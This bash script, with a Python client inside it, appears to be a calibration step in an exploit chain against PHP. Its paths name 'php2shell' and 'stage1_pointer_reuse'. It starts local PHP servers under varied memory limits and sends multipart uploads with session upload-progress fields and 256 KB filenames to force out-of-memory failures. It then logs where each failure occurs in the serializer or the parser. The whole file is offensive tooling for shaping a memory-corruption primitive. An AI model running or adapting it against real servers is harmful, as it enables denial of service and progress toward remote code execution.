#!/usr/bin/env bash
# Calibration sweep: which (memory_limit x nfiles) combos land the OOM
# INSIDE the serializer (site zend_smart_str.c) vs. in the multipart parser
# (site zend_string.h). Observable via error_log text only.
set -uo pipefail
BASE=/home/wh1t3r0se/ph2s_leakmap
PHP=/home/wh1t3r0se/php2shell-lab/release/sapi/cli/php
OUT="$BASE/stage1_pointer_reuse/calibration"
mkdir -p "$OUT"
PORT=8100
: > "$OUT/sweep.csv"
echo "memory_limit,nfiles,http_status,latency_s,oom_site,tried_bytes" > "$OUT/sweep.csv"
IDX=0
for ML in 8M 10M 12M 16M; do
  for NF in 16 20 24 28 32; do
    IDX=$((IDX+1))
    D="$OUT/case_$IDX"; mkdir -p "$D/docroot/sess"
    printf '<?php echo "OK\n";' > "$D/docroot/index.php"
    cat > "$D/lab.ini" <<EOF
memory_limit=$ML
session.upload_progress=On
session.use_strict_mode=0
session.save_path=$D/docroot/sess
error_log=$D/error.log
display_errors=0
log_errors=1
max_execution_time=30
upload_max_filesize=64M
post_max_size=64M
max_file_uploads=50
EOF
    "$PHP" -S 127.0.0.1:$PORT -t "$D/docroot" -c "$D/lab.ini" >/dev/null 2>&1 &
    SRV=$!
    sleep 0.6
    python3 - "$PORT" "$NF" <<'PYEOF' > "$D/res.txt" 2>&1
import http.client, sys, time
port, nf = int(sys.argv[1]), int(sys.argv[2])
def part(name, value, fname=None):
    b = '--BOUNDARYX\r\nContent-Disposition: form-data; name="%s"' % name
    if fname: b += '; filename="%s"' % fname
    b += '\r\n\r\n'
    return b.encode() + value + b'\r\n'
body = part('PHPSESSID', b'calsid01') + part('PHP_SESSION_UPLOAD_PROGRESS', b'cal')
for i in range(nf):
    body += part('f%d' % i, b'X', 'A' * 262144)
body += b'--BOUNDARYX--\r\n'
t0 = time.perf_counter()
try:
    c = http.client.HTTPConnection('127.0.0.1', port, timeout=30)
    c.request('POST', '/', body, {'Content-Type': 'multipart/form-data; boundary=BOUNDARYX',
                                  'Content-Length': str(len(body))})
    r = c.getresponse(); r.read(); st = r.status; c.close()
    dt = time.perf_counter() - t0
except Exception as e:
    st, dt = -1, time.perf_counter() - t0
print("%s,%.3f" % (st, dt))
PYEOF
    kill $SRV 2>/dev/null; wait $SRV 2>/dev/null
    ST=$(cut -d, -f1 "$D/res.txt" 2>/dev/null)
    LT=$(cut -d, -f2 "$D/res.txt" 2>/dev/null)
    SITE="-"; TRIED="-"
    if [ -f "$D/error.log" ]; then
      LINE=$(grep 'exhausted at' "$D/error.log" | head -1)
      SITE=$(echo "$LINE" | sed -n 's/.*exhausted at \([^ ]*\).*/\1/p' | tr ',' '_')
      TRIED=$(echo "$LINE" | sed -n 's/.*tried to allocate \([0-9]*\).*/\1/p')
    fi
    echo "$ML,$NF,${ST:-?},${LT:-?},${SITE:-none},${TRIED:-0}" >> "$OUT/sweep.csv"
  done
done
cat "$OUT/sweep.csv"
